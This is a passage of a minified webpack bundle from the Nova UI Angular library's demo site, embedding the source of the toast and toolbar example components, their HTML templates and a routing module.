<h3>Page settings</h3>\n        <div>\n            <label class="px-3 w-25" for="txtCount">\n                Number of toasts to show:\n            </label>\n            <input type="number" id="txtCount" [(ngModel)]="count" />\n        </div>\n\n        <label class="px-3 w-25"> Toast type </label>\n        <input\n            id="radioError"\n            type="radio"\n            name="type"\n            value="error"\n            [(ngModel)]="type"\n        />\n        <label for="radioError" class="px-3"> error </label>\n        <input\n            id="radioInfo"\n            type="radio"\n            name="type"\n            value="info"\n            [(ngModel)]="type"\n        />\n        <label for="radioInfo" class="px-3"> info </label>\n        <input\n            id="radioSuccess"\n            type="radio"\n            name="type"\n            value="success"\n            [(ngModel)]="type"\n        />\n        <label for="radioSuccess" class="px-3"> success </label>\n        <input\n            id="radioWarning"\n            type="radio"\n            name="type"\n            value="warning"\n            [(ngModel)]="type"\n        />\n        <label for="radioWarning" class="px-3"> warning </label>\n    </div>\n\n    <div class="py-2">\n        <h3>Toast Configuration</h3>\n        <div>\n            <label class="px-3 w-25" for="txtMessage"> message </label>\n            <input type="text" id="txtMessage" [(ngModel)]="toast.message" />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="txtTitle"> title </label>\n            <input type="text" id="txtTitle" [(ngModel)]="toast.title" />\n        </div>\n    </div>\n\n    <div class="py-2">\n        <h3>Options</h3>\n        <div>\n            <label class="px-3 w-25" for="txtTimeOut"> timeOut </label>\n            <input\n                type="text"\n                id="txtTimeOut"\n                [(ngModel)]="toast.options.timeOut"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="txtExtendedTimeOut">\n                extendedTimeOut\n            </label>\n            <input\n                type="text"\n                id="txtExtendedTimeOut"\n                [(ngModel)]="toast.options.extendedTimeOut"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbCloseButton">closeButton</label>\n            <input\n                type="checkbox"\n                id="chbCloseButton"\n                [(ngModel)]="toast.options.closeButton"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbProgressBar">progressBar</label>\n            <input\n                type="checkbox"\n                id="chbProgressBar"\n                [(ngModel)]="toast.options.progressBar"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25">progressAnimation</label>\n            <input\n                id="radioIncreasing"\n                type="radio"\n                name="progressAnimation"\n                value="increasing"\n                [(ngModel)]="toast.options.progressAnimation"\n            />\n            <label for="radioIncreasing" class="px-3"> increasing </label>\n            <input\n                id="radioDecreasing"\n                type="radio"\n                name="progressAnimation"\n                value="decreasing"\n                [(ngModel)]="toast.options.progressAnimation"\n            />\n            <label for="radioDecreasing" class="px-3"> decreasing </label>\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbEnableHtml">enableHtml</label>\n            <input\n                type="checkbox"\n                id="chbEnableHtml"\n                [(ngModel)]="toast.options.enableHtml"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="txtToastClass">toastClass</label>\n            <input\n                type="text"\n                id="txtToastClass"\n                [(ngModel)]="toast.options.toastClass"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25">positionClass</label>\n            <span class="d-inline-block" style="vertical-align: middle">\n                <input\n                    id="radioTopCenter"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--top-center"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioTopCenter" class="px-3"> TOP_CENTER </label>\n                <input\n                    id="radioTopLeft"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--top-left"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioTopLeft" class="px-3"> TOP_LEFT </label>\n                <input\n                    id="radioTopRight"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--top-right"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioTopRight" class="px-3"> TOP_RIGHT </label>\n                <input\n                    id="radioTopFullWidth"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--top-full-width"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioTopFullWidth" class="px-3">\n                    TOP_FULL_WIDTH\n                </label>\n                <br />\n                <input\n                    id="radioBottomCenter"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--bottom-center"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioBottomCenter" class="px-3">\n                    BOTTOM_CENTER\n                </label>\n                <input\n                    id="radioBottomLeft"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--bottom-left"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioBottomLeft" class="px-3"> BOTTOM_LEFT </label>\n                <input\n                    id="radioBottomRight"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--bottom-right"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioBottomRight" class="px-3">\n                    BOTTOM_RIGHT\n                </label>\n                <input\n                    id="radioBottomFullWidth"\n                    type="radio"\n                    name="positionClass"\n                    value="nui-toast--bottom-full-width"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioBottomFullWidth" class="px-3">\n                    BOTTOM_FULL_WIDTH\n                </label>\n                <input\n                    id="radioCustomClass"\n                    type="radio"\n                    name="positionClass"\n                    value="demoToastCustomClass"\n                    [(ngModel)]="toast.options.positionClass"\n                />\n                <label for="radioCustomClass" class="px-3">\n                    CUSTOM_CLASS\n                </label>\n            </span>\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbClickToDismiss"\n                >clickToDismiss</label\n            >\n            <input\n                type="checkbox"\n                id="chbClickToDismiss"\n                [(ngModel)]="toast.options.clickToDismiss"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbStickyError">stickyError</label>\n            <input\n                type="checkbox"\n                id="chbStickyError"\n                [(ngModel)]="toast.options.stickyError"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="txtMaxOpened">maxOpened</label>\n            <input\n                type="number"\n                id="txtMaxOpened"\n                [(ngModel)]="toast.options.maxOpened"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbAutoDismiss">autoDismiss</label>\n            <input\n                type="checkbox"\n                id="chbAutoDismiss"\n                [(ngModel)]="toast.options.autoDismiss"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbNewestOnTop">newestOnTop</label>\n            <input\n                type="checkbox"\n                id="chbNewestOnTop"\n                [(ngModel)]="toast.options.newestOnTop"\n            />\n        </div>\n        <div>\n            <label class="px-3 w-25" for="chbPreventDuplicates"\n                >preventDuplicates</label\n            >\n            <input\n                type="checkbox"\n                id="chbPreventDuplicates"\n                [(ngModel)]="toast.options.preventDuplicates"\n            />\n        </div>\n    </div>\n\n    <div class="p-5" style="text-align: center">\n        <button class="px-5" id="btnFire" (click)="fireToast()">\n            Fire Toast(s)!\n        </button>\n        <button class="px-3 ml-3" id="btnReset" (click)="reset()">\n            Reset form\n        </button>\n    </div>\n</div>\n'},50550:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport {\n    IActiveToast,\n    IToastConfig,\n    IToastDeclaration,\n    IToastService,\n    ToastPositionClass,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-test",\n    templateUrl: "./toast-test.component.html",\n})\nexport class ToastTestComponent implements OnInit {\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    private defaults: IToastDeclaration = {\n        message: "",\n        title: "",\n        options: {\n            timeOut: 5000,\n            extendedTimeOut: 2000,\n            closeButton: true,\n            progressBar: true,\n            progressAnimation: "decreasing",\n            toastClass: "nui-toast",\n            positionClass: ToastPositionClass.TOP_RIGHT,\n            maxOpened: 0, // unlimited\n            newestOnTop: true,\n            enableHtml: false,\n        },\n    };\n    // Using intersection type to avoid adding optional chaining operator (?) multiple times in template\n    // because options property is optional.\n    public toast: IToastDeclaration & { options: IToastConfig };\n    public count: number;\n    public type: string;\n\n    public ngOnInit(): void {\n        this.reset();\n    }\n\n    public fireToast(): void {\n        const funcs: Record<\n            string,\n            (toast: IToastDeclaration) => IActiveToast\n        > = {\n            error: (toast) => this.toastService.error(toast),\n            info: (toast) => this.toastService.info(toast),\n            success: (toast) => this.toastService.success(toast),\n            warning: (toast) => this.toastService.warning(toast),\n        };\n\n        for (let i = 0; i < this.count; i++) {\n            funcs[this.type](this.toast);\n        }\n    }\n\n    public reset(): void {\n        this.count = 1;\n        this.type = "info";\n        this.toast = {\n            ...this.defaults,\n            options: { ...this.defaults.options },\n        };\n        this.toastService.clear();\n    }\n}\n'},14638:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    id="nui-info-toast"\n    (click)="onShowInfo($event)"\n    i18n\n>\n    Info\n</button>\n<button\n    nui-button\n    type="button"\n    id="nui-success-toast"\n    (click)="onShowSuccess($event)"\n    i18n\n>\n    Success\n</button>\n<button\n    nui-button\n    type="button"\n    id="nui-warning-toast"\n    (click)="onShowWarning($event)"\n    i18n\n>\n    Warning\n</button>\n<button\n    nui-button\n    type="button"\n    id="nui-error-toast"\n    (click)="onShowError($event)"\n    i18n\n>\n    Error\n</button>\n<button\n    nui-button\n    type="button"\n    id="nui-hide-all-toasts"\n    (click)="clear()"\n    i18n\n>\n    Hide Toasts\n</button>\n'},714:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport { IToastConfig, IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-type-example",\n    templateUrl: "./toast-type.example.component.html",\n})\nexport class ToastTypeExampleComponent implements OnInit {\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public onShowInfo(highlightMode: boolean): void {\n        this.toastService.info({\n            title: $localize`Info`,\n            message: $localize`E pluribus unum (/\u02c8i\u02d0 \u02c8pl\u028a\u0259r\u026ab\u0259s \u02c8ju\u02d0n\u0259m/; Latin: [\u02c8e\u02d0 \u02c8plu\u02d0r\u026ab\u028as \u02c8u\u02d0n\u0169\u02d0]) is Latin for \'Out of many, one\'`,\n            options: this.getOptions(),\n        });\n    }\n\n    public onShowSuccess(highlightMode: boolean): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Well done!`,\n            options: this.getOptions(),\n        });\n    }\n\n    public onShowWarning(highlightMode: boolean): void {\n        this.toastService.warning({\n            title: $localize`Warning`,\n            message: $localize`There can be only one.`,\n            options: this.getOptions(),\n        });\n    }\n\n    public onShowError(highlightMode: boolean): void {\n        this.toastService.error({\n            title: $localize`Error`,\n            message: $localize`Nope.`,\n            options: this.getOptions(),\n        });\n    }\n\n    public clear(): void {\n        this.toastService.clear();\n    }\n\n    private getOptions(): IToastConfig {\n        return {\n            timeOut: 3000,\n            extendedTimeOut: 1000,\n        };\n    }\n}\n'},82032:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container pt-5">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Toast Positioned defferently</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex justify-content-start" id="nui-toast-positions">\n                <button\n                    id="nui-toast-button-all-positions"\n                    (click)="showToastsAllPositions($event, 200000)"\n                >\n                    Trigger all positions\n                </button>\n            </div>\n            <div class="d-flex justify-content-start" id="nui-toast-fw">\n                <button\n                    id="nui-toast-position-fw"\n                    (click)="showToastsFullWidth($event, 10000)"\n                >\n                    Full Width\n                </button>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Basic Toast Positioned defferently</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex justify-content-start">\n                <button\n                    id="nui-toast-clear-all-toasts"\n                    (click)="clearToast($event)"\n                >\n                    Clear All Toasts\n                </button>\n                <button id="nui-toast-sticky" (click)="callStickyToast($event)">\n                    Call Sticky Error!\n                </button>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Toast messages adjust size</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div\n                class="d-flex justify-content-start"\n                id="nui-toast-buttons-chain"\n            >\n                <button\n                    id="nui-toast-adjust-size"\n                    (click)="showToastsAdjustSize($event, 10000)"\n                >\n                    Trigger all toast messages\n                </button>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Toast messages with no header</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div\n                class="d-flex justify-content-start"\n                id="nui-toast-buttons-chain-no-header"\n            >\n                <button\n                    id="nui-toast-no-header"\n                    (click)="showToastsNoHeader($event, 10000)"\n                >\n                    Trigger all toast messages\n                </button>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Toast messages with progress bar</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex justify-content-start" id="nui-toast-positions">\n                <button\n                    id="nui-toast-button-all-positions-progress-bar"\n                    (click)="showToastsAllPositions($event, 300000, true)"\n                >\n                    Trigger all positions\n                </button>\n            </div>\n        </div>\n    </div>\n</div>\n'},76176:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport {\n    IToastConfig,\n    IToastService,\n    ToastPositionClass,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-visual",\n    templateUrl: "./toast-visual-test.component.html",\n})\nexport class ToastVisualTestComponent implements OnInit {\n    private errorMessage: string = `Something went wrong + in addition there is an extremely\n    long line that verifies that the toast expands as more text comes into it. More or less text -\n    Toast messages must look good either way!`;\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public showToastsAllPositions(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false\n    ): void {\n        this.onShowInfo(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_LEFT\n        );\n        this.onShowError(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT,\n            "Error",\n            this.errorMessage\n        );\n        this.onShowSuccess(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.BOTTOM_LEFT\n        );\n        this.onShowWarning(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.BOTTOM_RIGHT\n        );\n        this.onShowInfo(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_CENTER\n        );\n        this.onShowError(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.BOTTOM_CENTER\n        );\n    }\n\n    public showToastsFullWidth(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false\n    ): void {\n        this.onShowSuccess(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_FULL_WIDTH\n        );\n        this.onShowWarning(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.BOTTOM_FULL_WIDTH\n        );\n    }\n\n    public showToastsAdjustSize(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false\n    ): void {\n        this.onShowInfo(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT\n        );\n        this.onShowSuccess(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT\n        );\n        this.onShowWarning(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT\n        );\n        this.onShowError(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT,\n            "Error",\n            this.errorMessage\n        );\n    }\n\n    public showToastsNoHeader(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false,\n        header: string = ""\n    ): void {\n        this.onShowInfo(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT,\n            header\n        );\n        this.onShowSuccess(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT,\n            header\n        );\n        this.onShowWarning(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT,\n            header\n        );\n        this.onShowError(\n            highlightMode,\n            timeout,\n            progress,\n            ToastPositionClass.TOP_RIGHT,\n            header\n        );\n    }\n\n    public onShowInfo(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false,\n        position: ToastPositionClass,\n        title: string = "Information",\n        message: string = "Some info message"\n    ): void {\n        this.toastService.info({\n            title: title,\n            message: `${message}`,\n            options: this.getOptions(timeout, position, progress),\n        });\n    }\n\n    public onShowError(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false,\n        position: ToastPositionClass,\n        title: string = "Failure!",\n        message: string = "Something went wrong"\n    ): void {\n        this.toastService.error({\n            title: title,\n            message: `${message}`,\n            options: this.getOptions(timeout, position, progress),\n        });\n    }\n\n    public onShowSuccess(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false,\n        position: ToastPositionClass,\n        title: string = "Well Done!",\n        message: string = "You\'re great!"\n    ): void {\n        this.toastService.success({\n            title: title,\n            message: `${message}`,\n            options: this.getOptions(timeout, position, progress),\n        });\n    }\n\n    public onShowWarning(\n        highlightMode: boolean,\n        timeout: number,\n        progress: boolean = false,\n        position: ToastPositionClass,\n        title: string = "Attention!",\n        message: string = "Pay attention!"\n    ): void {\n        this.toastService.warning({\n            title: title,\n            message: `${message}`,\n            options: this.getOptions(timeout, position, progress),\n        });\n    }\n\n    public callStickyToast(highlightMode: boolean): void {\n        this.toastService.error({\n            title: "Failure",\n            message: "This error is sticky!",\n            options: { stickyError: true },\n        });\n    }\n\n    public clearToast(highlightMode: boolean): void {\n        this.toastService.clear();\n    }\n\n    private getOptions(\n        timeout: number,\n        position: ToastPositionClass,\n        enableProgressBar: boolean = false\n    ): IToastConfig {\n        return {\n            timeOut: timeout,\n            extendedTimeOut: 2000,\n            positionClass: position,\n            progressBar: enableProgressBar,\n        };\n    }\n}\n'},70419:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiRadioModule,\n    NuiToastModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ToastBasicExampleComponent,\n    ToastConfigExampleComponent,\n    ToastEventsExampleComponent,\n    ToastExampleComponent,\n    ToastPositionExampleComponent,\n    ToastStickyErrorExampleComponent,\n    ToastTestComponent,\n    ToastTypeExampleComponent,\n    ToastVisualTestComponent,\n} from "./index";\nimport { ToastBasicHtmlExampleComponent } from "./toast-basic-html/toast-basic-html.example.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ToastExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "toast-visual-test",\n        component: ToastVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "test",\n        component: ToastTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiToastModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiMessageModule,\n        NuiRadioModule,\n        NuiDividerModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ToastBasicExampleComponent,\n        ToastBasicHtmlExampleComponent,\n        ToastConfigExampleComponent,\n        ToastEventsExampleComponent,\n        ToastExampleComponent,\n        ToastPositionExampleComponent,\n        ToastStickyErrorExampleComponent,\n        ToastTestComponent,\n        ToastTypeExampleComponent,\n        ToastVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("toast"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ToastModule {}\n'},67382:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./toolbar-basic/toolbar-basic.example.component";\nexport * from "./toolbar-docs/toolbar-docs.example.component";\nexport * from "./toolbar-embedded-content/toolbar-embedded-content.example.component";\nexport * from "./toolbar-selection/toolbar-selection.example.component";\nexport * from "./toolbar-item-types/toolbar-item-types.example.component";\nexport * from "./toolbar-test/toolbar-test.component";\nexport * from "./toolbar-visual-test/toolbar-visual-test.component";\n'},32544:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    <nui-toolbar>\n        <nui-toolbar-group i18n-title title="g1">\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="edit"\n                i18n-title\n                title="Edit"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="export"\n                i18n-title\n                title="Export"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="clear"\n                i18n-title\n                title="Clear"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="browse"\n                i18n-title\n                title="Browse"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="close"\n                i18n-title\n                title="Close"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="download"\n                i18n-title\n                title="Download"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group i18n-title title="g2">\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="cut"\n                i18n-title\n                title="Cut"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="secondary"\n                icon="copy"\n                i18n-title\n                title="Copy"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="secondary"\n                icon="assign"\n                i18n-title\n                title="Assign"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="primary"\n                icon="add"\n                i18n-title\n                title="Add"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="onShowToast($event)"\n                type="secondary"\n                icon="tag"\n                i18n-title\n                title="Tag"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n    </nui-toolbar>\n</div>\n'},47232:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  